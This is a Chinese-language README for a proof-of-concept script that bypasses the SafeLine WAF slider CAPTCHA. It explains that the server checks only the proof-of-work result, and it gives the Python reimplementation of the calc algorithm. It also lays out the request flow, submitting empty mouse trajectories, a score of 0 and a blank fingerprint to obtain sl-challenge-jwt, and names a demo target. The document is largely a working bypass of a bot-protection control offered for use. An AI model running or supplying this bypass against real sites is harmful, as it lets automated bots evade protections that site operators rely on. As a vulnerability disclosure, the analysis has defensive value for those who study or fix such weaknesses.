# SafeLine WAF v2 绕过

雷池 SafeLine WAF 行为验证绕过，程序化过滑动验证码，拿到 sl-challenge-jwt。

## 效果

```
==========================================================
  结果
==========================================================
  sl-session       = xxx
  sl-challenge-jwt = eyJ...
==========================================================
```

浏览器里效果：先弹出468验证页，脚本绕过，自动刷新变200展示正文。

## 用法

```bash
pip install requests urllib3 playwright
python -m playwright install chromium

python poc_safeline_bypass.py
```

## 核心发现

服务端只校验 proof-of-work 算没算对，不校验你是人是机器。

| 字段 | 正常传 | 实际传 | 服务端管不管 |
|------|--------|--------|-------------|
| serials | 鼠标拖滑块的轨迹 | `[]` 空 | 不管 |
| score | 反调试检测分数 | `0` | 不管 |
| visitorId | 浏览器指纹 | `""` 空 | 不管 |
| result | proof-of-work 计算结果 | 正确值 | **校验** |

所以只把 result 算对就行，轨迹指纹全空着传，照样过。

## 原理

SafeLine WAF 对受保护站点返回 468 + 滑块验证页。正常你要拖那个滑块，它会采集鼠标轨迹（serials）、浏览器指纹（visitorId）、反调试分数（score），然后调 `/api/verify` 提交。服务端验证通过就返回 `sl-challenge-jwt`，浏览器拿着这个 cookie 再请求就放行。

但我们分析了他的 `/api/verify`，发现服务端只看 `issue_id` + `result` 对不对。`result` 是一个 proof-of-work 哈希，算法在 `calc.js` 里明文写着，直接扒下来翻译成 Python 就行。

## 算法

```python
def calc(data):
    t, n = 1, len(data)
    r = (6 + n + sum(data)) % 6 + 6
    while r: t *= 6; r -= 1
    if t < 6666: t *= n
    if t > 0x3F940AA: t //= n
    for i, v in enumerate(data):
        t += pow(v, 3); t ^= i; t ^= v + i
    out = []
    while t: out.insert(0, t & 63); t >>= 6
    return out
```

来源: `/.safeline/challenge/v2/calc.js` 的 JS 回退路径，WASM 和 JS 回退用的同一套算法，没混淆。

## 流程

```
GET /hello.html → 468 + sl-session cookie + client_id
      ↓
POST /api/issue → challenge data 数组
      ↓
calc(data) → result
      ↓
POST /api/verify {result, serials:[], client:{score:0, ...}}
      ↓
sl-challenge-jwt
      ↓
带 cookie 请求 → 200
```

## 其他

demo 站每次请求都重新挑战，requests 二次请求还是 468 是正常的，不是绕过失败。真实环境 JWT 有效期大约 24 小时，带上就能过。

目标 demo: `https://demo.waf-ce.chaitin.cn:10088/hello.html`
